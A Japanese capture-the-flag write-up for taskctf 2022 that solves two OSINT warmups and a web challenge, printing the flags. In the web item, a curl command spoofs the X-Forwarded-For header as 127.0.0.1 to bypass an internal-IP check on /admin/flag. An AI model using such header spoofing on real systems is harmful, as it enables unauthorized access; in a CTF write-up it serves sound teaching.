# taskctf 2022

taskさん、1日早いですが誕生日おめでとうございます。「モーリーファンタジー代表」という名前で参加しました。体調が死んでてあまり参加できませんでしたが、隙を見て残りの問題も取り組みます。

本writeupでは、tutorial以外の問題を記載します。

- [\[osint warmup\] welcome (130 solves)](#osint-warmup-welcome-130-solves)
- [\[osint easy\] ramen (106 solves)](#osint-easy-ramen-106-solves)
- [\[web warmup\] robots (50 solves)](#web-warmup-robots-50-solves)
- [おわりに](#おわりに)

## [osint warmup] welcome (130 solves)

> 2019年のtaskctfのwelcome問題のFlagは何でしたっけ？

[st98さんのwriteup](https://st98.github.io/diary/posts/2019-12-06-taskctf.html)が出てきたので、そちらを参照しました。

```
taskctf{let's_enj0y!}
```


## [osint easy] ramen (106 solves)

> このラーメン屋の名前は何でしょう？
正式名称ではなく、漢字のみで taskctf{ラーメン屋の名前}の形式で回答してください。 ラーメン屋の名前がラーメン二郎であれば、 taskctf{二郎} がFlagになります。

google lensで調べました。麻婆の雰囲気が似ている画像を調べました。結果、[SHIBIRE NOODLE 蝋燭屋](https://sarah30.com/menus/2302620)というお店だと分かりました。


```
taskctf{蝋燭屋}
```

## [web warmup] robots (50 solves)

> Flagが漏洩してるって聞いたけど、本当ですか？？？

配布されたURLにアクセスすると、ロボットの画像が出てきました。`/robots.txt`にアクセスすると、以下の内容が返ってきました。

```js
User-Agent: *
Disallow: /admin/flag%
```

次に`/admin/flag`にアクセスすると、内部IP以外は通さないようになってました。

```js
<body>
    <div class="container">
        <h1>401 Unauthorized</h1>
        <p>(省略) is not internal IP address :(</p>
    </div>
</body>
```

そこでヘッダに`X-Forwarded-For: 127.0.0.1`を追加することで回避しました。

```bash
$ curl http://<addr>/admin/flag -H "X-Forwarded-For: 127.0.0.1" | grep ctf
        <p>taskctf{th15_c0ntr0l_y0u_th1nk_y0u_h4ve_1s_4n_1llu5i0n}</p>
```


```
taskctf{th15_c0ntr0l_y0u_th1nk_y0u_h4ve_1s_4n_1llu5i0n}
```


## おわりに

毎年taskさんのみで作問・運営されており、その対応の広さに驚くことばかりです。特にCode of Conduct(行動規範)が提示された時は、私がCTF運営側だったとしても、設けることすら思いつかなかっただろうなと思いました。

今年も運営ありがとうございました！
